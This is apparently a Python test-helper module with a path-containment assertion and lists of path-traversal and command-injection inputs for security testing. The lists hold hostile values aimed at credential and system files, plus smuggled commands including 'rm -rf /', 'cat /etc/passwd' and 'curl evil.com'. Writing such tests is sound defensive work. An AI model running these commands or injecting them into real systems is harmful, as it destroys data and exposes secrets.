from pathlib import Path

def assert_path_contained(path: Path, base: Path) -> None:
    assert str(path.resolve()).startswith(str(base.resolve())), \
        f"Path {path} escapes base {base}"

def make_traversal_attempts() -> list[str]:
    return [
        "../secret",
        "../../etc/passwd",
        "/etc/shadow",
        "~/.ssh/id_rsa",
        "....//....//etc/passwd",
        "%2e%2e%2fetc%2fpasswd",
    ]

def make_injection_attempts() -> list[str]:
    return [
        "; rm -rf /",
        "$(whoami)",
        "`id`",
        "| cat /etc/passwd",
        "&& curl evil.com",
        "\n/bin/sh",
    ]
